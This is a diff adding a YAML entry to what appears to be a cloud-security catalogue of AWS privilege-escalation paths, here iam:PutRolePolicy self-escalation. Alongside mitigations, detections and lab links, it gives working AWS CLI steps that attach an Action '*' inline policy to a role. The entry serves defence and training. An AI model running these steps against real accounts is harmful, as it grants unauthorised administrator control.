@@ -1,0 +1,156 @@
+id: iam-005
+name: iam:PutRolePolicy
+category: self-escalation
+services:
+  - iam
+permissions:
+  required:
+    - permission: iam:PutRolePolicy
+      resourceConstraints: Target role must be in the Resource section. For self-escalation, must have permission on own role.
+  additional:
+    - permission: iam:GetRolePolicy
+      resourceConstraints: Helpful for viewing existing inline policies before modification
+    - permission: iam:ListRolePolicies
+      resourceConstraints: Useful for discovering what inline policies already exist on the role
+description: A principal with `iam:PutRolePolicy` can attach inline policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. For self-escalation, the role can attach an inline policy to itself with any permissions, including full administrative access. A principal can also leverage this to escalate the permissions of another principal they can access.
+prerequisites:
+  admin:
+    - Principal must be a role (not a user, since IAM users cannot have inline role policies)
+    - The role must have `iam:PutRolePolicy` permission on itself
+  lateral:
+    - Principal must be a role (not a user, since IAM users cannot have inline role policies)
+    - The role must have `iam:PutRolePolicy` permission on itself
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        # Create a policy document with elevated permissions
+        cat > escalation_policy.json <<EOF
+        {
+          "Version": "2012-10-17",
+          "Statement": [
+            {
+              "Effect": "Allow",
+              "Action": "*",
+              "Resource": "*"
+            }
+          ]
+        }
+        EOF
+      description: Create a JSON policy document granting administrative access
+    - step: 2
+      command: |
+        aws iam put-role-policy \
+          --role-name @rolename \
+          --policy-name AdminEscalation \
+          --policy-document file://escalation_policy.json
+      description: Attach the inline policy with elevated permissions to the target role
+    - step: 3
+      command: aws sts get-caller-identity
+      description: Verify the new permissions are active (for self-escalation, credentials remain the same)
+  pathrunner:
+    - step: 1
+      command: pathrunner use iam-005
+      description: Load the iam-005 exploit module in Pathrunner.
+    - step: 2
+      command: pathrunner exploit
+      description: Execute the privilege escalation.
+recommendation: |
+  Restrict access to `iam:PutRolePolicy` using the principle of least privilege. Very few principals need this permission, so it should be restricted to only the few principals that need it.
+
+  Use IAM policy conditions to restrict which roles can have policies attached:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PutRolePolicy",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificRole"
+  }
+  ```
+
+  Monitor use of this sensitive permission using CloudTrail and SIEM detections:
+  - Alert on `PutRolePolicy` API calls, especially when the actor and target role are the same (self-escalation)
+  - Monitor for policy documents containing broad permissions like `"Action": "*"`
+  - Look for usage anomalies (principals who don't normally use this permission)
+  - Review inline policies regularly for overly permissive statements
+limitations: |
+  This path provides administrative access because the attacker controls the policy document content. The attacker can embed any permissions directly into the principal, guaranteeing administrative access regardless of what policies exist in the environment. However, even limited additional permissions may enable multi-hop attacks.
+discoveryAttribution:
+  firstDocumented:
+    author: Spencer Gietzen
+    organization: Rhino Security Labs
+    date: 2019
+    link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+references:
+  - title: AWS Privilege Escalation Methods and Mitigation
+    url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+  - title: HackTricks - AWS - IAM Privesc
+    url: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc/index.html#iamattachrolepolicy--stsassumeroleiamcreaterole--iamputuserpolicy--iamputgrouppolicy--iamputrolepolicy
+  - title: HackingTheCloud - PutRolePolicy Privilege Escalation
+    url: https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/#iamputrolepolicy
+  - title: Well, That Escalated Quickly - Privesc 12
+    url: https://labs.bishopfox.com/tech-blog/privilege-escalation-in-aws
+relatedPaths:
+  - iam-007
+  - iam-009
+  - iam-011
+detectionTools:
+  cloudsplaining: https://github.com/salesforce/cloudsplaining/blob/015f16030f35a40631560a895d5ae416f58b6a94/cloudsplaining/shared/constants.py#L124
+  pacu: https://github.com/RhinoSecurityLabs/pacu/blob/50e7ad2d885b7ab4bc130f44b798ca85ed4d7a91/pacu/modules/iam__privesc_scan/main.py#L423
+  prowler: https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L36
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: privesc-self-escalation/to-admin/iam-putrolepolicy
+    description: Deploy Terraform into your own AWS account to practice this attack path
+  iam-vulnerable:
+    type: open-source
+    githubLink: https://github.com/BishopFox/iam-vulnerable
+    scenario: IAM-PutRolePolicy
+    description: Deploy Terraform into your own AWS account and practice individual exploitation paths
+  cybr:
+    type: closed-source
+    description: Hosted learning environment with interactive AWS security labs
+    scenario: https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamputrolepolicy-privesc/
+    scenarioPricingModel: paid
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Role
+      type: principal
+      description: The IAM role with `iam:PutRolePolicy` permission on itself. This role will attach an inline policy to itself to escalate privileges.
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: 'The role successfully attached an inline policy with administrative permissions (Action: "*") to itself. The role now has full administrative access to the AWS account.'
+  edges:
+    - from: start
+      to: admin
+      label: iam:PutRolePolicy on self
+      description: |
+        The role uses `iam:PutRolePolicy` to attach an inline policy to itself with full administrative permissions. Since the attacker controls the policy document content, they can embed any permissions directly into the role.
+
+        Command:
+        ```bash
+        aws iam put-role-policy \
+          --role-name my-role \
+          --policy-name AdminEscalation \
+          --policy-document file://escalation_policy.json
+        ```
+
+        The policy document contains:
+        ```json
+        {
+          "Version": "2012-10-17",
+          "Statement": [
+            {
+              "Effect": "Allow",
+              "Action": "*",
+              "Resource": "*"
+            }
+          ]
+        }
+        ```
+
+        The credentials remain the same - the role immediately gains the new permissions without needing to assume a different role or create new access keys.
